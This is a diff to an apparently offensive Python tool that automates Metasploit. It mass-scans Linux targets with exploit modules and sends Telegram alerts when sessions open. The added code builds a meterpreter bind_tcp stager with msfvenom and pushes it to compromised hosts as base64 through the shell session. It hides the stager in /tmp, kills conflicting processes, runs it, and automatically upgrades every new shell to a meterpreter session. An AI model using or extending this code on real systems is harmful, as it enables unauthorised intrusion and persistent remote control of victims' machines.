@@ -6,6 +6,7 @@ import html
 import psutil
 import time
 import socket
+import base64
 import subprocess
 import psycopg2
 import requests
@@ -23,13 +24,18 @@ DEBUG_MODE = int(os.getenv("DEBUG_MODE", "0"))
 
 LHOST = os.getenv("LHOST", "")
 LPORT = int(os.getenv("LPORT", "4444"))
+BIND_PORT = int(os.getenv("BIND_PORT", "5556"))
 
 
 def read_secret(name: str) -> str | None:
+    # Env var takes priority (allows override without recreating Docker secrets)
+    env_val = os.getenv(name.upper())
+    if env_val:
+        return env_val
     p = Path(f"/run/secrets/{name}")
     if p.exists():
         return p.read_text().strip()
-    return os.getenv(name.upper())
+    return None
 
 
 def send_telegram_alert(sessions: dict, host: str) -> None:
@@ -243,6 +249,112 @@ def check_target(console, fullname, rhosts, rport):
         return True  # en cas d'erreur, procéder quand même
 
 
+def upgrade_to_meterpreter(client, sid, host, bind_port=None):
+    """
+    Upgrade une shell session en meterpreter via bind_tcp.
+    Pas de LHOST requis — le container se connecte AU target (bind, pas reverse).
+    """
+    if bind_port is None:
+        bind_port = BIND_PORT
+
+    print(f"\n[UPGRADE] Session {sid} ({host}) → meterpreter (bind_tcp:{bind_port})...")
+
+    c = client.consoles.console()
+    c.read()
+
+    def shell_cmd(cmd):
+        c.write(f'sessions -c "{cmd}" -i {sid}\n')
+        for _ in range(6):
+            time.sleep(1.5)
+            out = c.read()['data']
+            if not c.is_busy():
+                return out
+        return c.read()['data']
+
+    # 1. Détecter l'architecture
+    arch = 'x86'
+    out = shell_cmd('uname -m')
+    if 'x86_64' in out:
+        arch = 'x64'
+    print(f"[UPGRADE] Arch détectée: {arch}")
+
+    payload = f'linux/{arch}/meterpreter/bind_tcp'
+    elf_path = f'/tmp/.uzi_{sid}'
+
+    # 2. Générer le stager avec msfvenom
+    result = subprocess.run(
+        ['/opt/metasploit/msfvenom', '-p', payload,
+         f'LPORT={bind_port}', '-f', 'elf', '-o', elf_path],
+        capture_output=True
+    )
+    if not os.path.exists(elf_path):
+        print(f"[UPGRADE] msfvenom échoué: {result.stderr.decode()[:200]}")
+        return None
+
+    # 3. Injecter via la session shell (base64 → décode → exécute)
+    with open(elf_path, 'rb') as f:
+        b64 = base64.b64encode(f.read()).decode()
+    os.unlink(elf_path)
+
+    remote_b64 = f'/tmp/.p{sid}'
+    remote_elf = f'/tmp/.m{sid}'
+
+    # Nettoyer tout stager précédent sur ce port (évite "address already in use")
+    shell_cmd(f'fuser -k {bind_port}/tcp 2>/dev/null; pkill -9 -f {remote_elf} 2>/dev/null; rm -f {remote_b64} {remote_elf}; true')
+    time.sleep(1)
+
+    shell_cmd(f'printf "{b64}" > {remote_b64}')
+    shell_cmd(f'base64 -d {remote_b64} > {remote_elf} && chmod +x {remote_elf} && {remote_elf} &')
+    time.sleep(3)
+
+    # 4. Démarrer le handler bind_tcp (se connecte AU target)
+    known = set(client.sessions.list.keys())
+    h = client.consoles.console()
+    h.read()
+    for cmd in [
+        'use exploit/multi/handler',
+        f'set PAYLOAD {payload}',
+        f'set LPORT {bind_port}',
+        f'set RHOST {host}',
+        'set ExitOnSession false',
+        'run -j',
+    ]:
+        h.write(cmd + '\n')
+        time.sleep(0.5)
+
+    # 5. Attendre la session meterpreter
+    for _ in range(20):
+        time.sleep(2)
+        h.read()
+        new = {k: v for k, v in client.sessions.list.items()
+               if k not in known and v.get('type') == 'meterpreter'}
+        if new:
+            msid = list(new.keys())[0]
+            info = new[msid]
+            print(f"[UPGRADE] Meterpreter session {msid} — "
+                  f"{info.get('platform')}/{info.get('arch')} as {info.get('username')}")
+            return msid
+
+    print("[UPGRADE] Timeout — upgrade échoué")
+    return None
+
+
+def handle_new_sessions(client, sessions, upgraded_sessions, host):
+    """Upgrade les nouvelles shell sessions, alerte Telegram avec le résultat final."""
+    new_shells = {k: v for k, v in sessions.items()
+                  if k not in upgraded_sessions and v.get('type') == 'shell'}
+    for sid, info in new_shells.items():
+        upgraded_sessions.add(sid)
+        msid = upgrade_to_meterpreter(client, sid, info.get('session_host', str(host)))
+        if msid:
+            upgraded_sessions.add(msid)
+
+    current = client.sessions.list
+    if current:
+        print(f"[SESSION] {len(current)} session(s) actives: {list(current.keys())}")
+        send_telegram_alert(current, str(host))
+
+
 # Boucle principale
 def main():
     pg_ip = get_postgres_ip()
@@ -297,6 +409,8 @@ def main():
         debug_index = 0
     else:
         search_results = client.modules.search('linux')
+
+    upgraded_sessions = set()
 
     while True:
 
@@ -409,16 +523,15 @@ def main():
                    time.sleep(1)
               sessions = client.sessions.list
               if sessions:
-                  print(f"[SESSION] {len(sessions)} session(s) actives: {list(sessions.keys())}")
-                  send_telegram_alert(sessions, host)
+                  handle_new_sessions(client, sessions, upgraded_sessions, host)
 
      check_con.destroy()
      print(f"[INFO] Scan de {host} terminé.")
 
      sessions = client.sessions.list
-     print(f"[INFO] Sessions actives: {sessions}")
+     print(f"[INFO] Sessions actives: {list(sessions.keys())}")
      if sessions:
-         send_telegram_alert(sessions, host)
+         handle_new_sessions(client, sessions, upgraded_sessions, host)
 
 
 if __name__ == "__main__":
